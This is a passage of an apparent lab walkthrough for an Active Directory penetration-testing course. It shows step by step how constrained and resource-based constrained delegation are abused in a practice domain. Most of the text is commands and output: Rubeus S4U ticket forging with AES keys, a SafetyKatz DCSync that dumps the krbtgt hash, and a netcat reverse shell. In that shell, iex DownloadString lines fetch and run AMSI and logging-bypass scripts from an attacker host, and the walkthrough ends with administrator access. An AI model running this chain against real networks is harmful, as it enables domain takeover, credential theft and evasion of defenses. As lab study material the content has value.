 Directory of \\dcorp-mssql.dollarcorp.moneycorp.local\c$

05/08/2021  12:15 AM    <DIR>          PerfLogs
11/14/2022  04:44 AM    <DIR>          Program Files
11/14/2022  04:43 AM    <DIR>          Program Files (x86)
11/15/2022  08:06 AM    <DIR>          Transcripts
11/15/2022  01:48 AM    <DIR>          Users
11/11/2022  05:22 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   6,214,402,048 bytes free
```

For the next task, enumerate the computer accounts with coenstrained delegation enabled using PowerView:

```
PS C:\AD\Tools> Get-DomainComputer -TrustedToAuth

pwdlastset                    : 11/11/2022 11:16:12 PM
logoncount                    : 60
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DCORP-ADMINSRV,OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 2/24/2023 12:45:04 AM
whencreated                   : 11/12/2022 7:16:12 AM
samaccountname                : DCORP-ADMINSRV$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 3/3/2023 10:39:12 AM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2022 Datacenter
instancetype                  : 4
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
objectguid                    : 2e036483-7f45-4416-8a62-893618556370
operatingsystemversion        : 10.0 (20348)
lastlogoff                    : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata         : {11/15/2022 4:16:45 AM, 1/1/1601 12:00:00 AM}
serviceprincipalname          : {WSMAN/dcorp-adminsrv, WSMAN/dcorp-adminsrv.dollarcorp.moneycorp.local, TERMSRV/DCORP-ADMINSRV, TERMSRV/dcorp-adminsrv.dollarcorp.moneycorp.local...}
usncreated                    : 13891
usnchanged                    : 119138
lastlogon                     : 3/3/2023 9:31:15 AM
badpwdcount                   : 0
cn                            : DCORP-ADMINSRV
msds-supportedencryptiontypes : 28
objectsid                     : S-1-5-21-719815819-3726368948-3917688648-1105

[snip]
```

### Abuse Constrained Delegation using dcorp-adminsrv$ with Rubeus <a href="#abuse-constrained-delegation-using-dcorp-adminsrv-with-rubeus" id="abuse-constrained-delegation-using-dcorp-adminsrv-with-rubeus"></a>

We have the AES keys of dcorp-adminsrv$ from dcorp-adminsrv machine. Run the below command from an elevated command prompt as SafetyKatz, that we will use for DCSync, would need that:

> dcorp-adminsrv$: e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  V2.2.1

[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\dcorp-adminsrv$'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[snip]

[*] Impersonating user 'Administrator' to target SPN 'time/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[*]   Final ticket will be for the alternate service 'ldap'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Building S4U2proxy request for service: 'time/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] Substituting alternative service name 'ldap'
[*] base64(ticket.kirbi) for SPN 'ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL': [snip]
[+] Ticket successfully imported!
```

Run the below command to abuse the LDAP ticket:

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"

[snip]

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 9:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

[snip]
```

***

## Resource-Based Constrained Delegation

Let’s use PowerView from a PowerShell session started using Invisi-Shell to enumerate Write permissions for a user that we have compromised.

```
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
. C:\AD\Tools\PowerView.ps1
```

After trying from multiple users or using BloodHound we would know <mark style="background-color:yellow;">that the user ciadmin has Write permissions on the computer object of dcorp-mgmt</mark>:

```
C:\AD\Tools> Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}

ObjectDN                : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688648-1121
IdentityReferenceName   : ciadmin
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=ci admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : user
```

> Recall that we compromised ciadmin from dcorp-ci.

We can either use the reverse shell we have on dcorp-ci as ciadmin or extract the credentials from dcorp-ci.

Let’s use the reverse shell (Jenkins) that we have and load PowerView there:

> Remember do the bypass in it machine (sblogin, amsi, etc...)

```
C:\Users\studentx> C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
listening on [any] 443 ...
connect to [172.16.100.1] from (UNKNOWN) [172.16.3.11] 51192: NO_DATA

[snip]

PS C:\Users\Administrator\.jenkins\workspace\projectx> iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/sbloggingbypass.txt')
PS C:\Users\Administrator\.jenkins\workspace\projectx> iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/Amsi-Byp.txt')
PS C:\Users\Administrator\.jenkins\workspace\projectx> iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/PowerView.ps1')
```

Now, configure RBCD on dcorp-mgmt for the student VMs.

You may like to set it for all the student VMs in your lab instance so that your fellow students can also abuse RBCD:

Your student VM hostname could be dcorp-studentX or dcorp-stdX.

```
PS C:\Users\Administrator\.jenkins\workspace\projectx> Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std453$' -Verbose
```

> Change; dcorp-student453$ to dcorp-std453$ (now us users has it names)

Check if RBCD is set correctly:

> If it dosent worked, its likely to be we didnt do the before step well

```
PS C:\Users\Administrator\.jenkins\workspace\projectx> Get-DomainRBCD

SourceName                 : DCORP-MGMT$
SourceType                 : MACHINE_ACCOUNT
SourceSID                  : S-1-5-21-719815819-3726368948-3917688648-1108
SourceAccountControl       : WORKSTATION_TRUST_ACCOUNT
SourceDistinguishedName    : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
ServicePrincipalName       : {WSMAN/dcorp-mgmt, WSMAN/dcorp-mgmt.dollarcorp.moneycorp.local, TERMSRV/DCORP-MGMT,
                             TERMSRV/dcorp-mgmt.dollarcorp.moneycorp.local...}
DelegatedName              : DCORP-studentx$
DelegatedType              : MACHINE_ACCOUNT
DelegatedSID               : S-1-5-21-719815819-3726368948-3917688648-4110
DelegatedAccountControl    : WORKSTATION_TRUST_ACCOUNT
DelegatedDistinguishedName : CN=DCORP-studentx,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local

[snip]
```

Get AES keys <mark style="background-color:yellow;">of your student VM</mark> (as we configured RBCD for it above). Run the below command from an elevated shell:

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"

[snip]

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-STD453$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 4/12/2026 5:04:09 AM
SID               : S-1-5-18

         * Username : dcorp-std453$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       5c805d75e761664230108bb332ae7835310b48b3636368ca74a09e94a470286c
           rc4_hmac_nt       0f541b805d8d6a548ed75ce06e850469
           rc4_hmac_old      0f541b805d8d6a548ed75ce06e850469
           rc4_md4           0f541b805d8d6a548ed75ce06e850469
           rc4_hmac_nt_exp   0f541b805d8d6a548ed75ce06e850469
           rc4_hmac_old_exp  0f541b805d8d6a548ed75ce06e850469

[snip]
```

> dcorp-std453$:
>
> 5c805d75e761664230108bb332ae7835310b48b3636368ca74a09e94a470286c

With Rubeus, abuse the RBCD to access `dcorp-mgmt` as Domain Administrator - Administrator:

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std453$ /aes256:5c805d75e761664230108bb332ae7835310b48b3636368ca74a09e94a470286c /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
[snip]

[*] Impersonating user 'administrator' to target SPN 'http/dcorp-mgmt'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)

[snip]
```

Check if we can access dcorp-mgmt:

```
C:\Windows\system32> winrs -r:dcorp-mgmt cmd
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator.dcorp> set username

Set username
USERNAME = administrator

C:\Users\Administrator.dcorp> set computername

Set computername
COMPUTERNAME=dcorp-mgmt
```
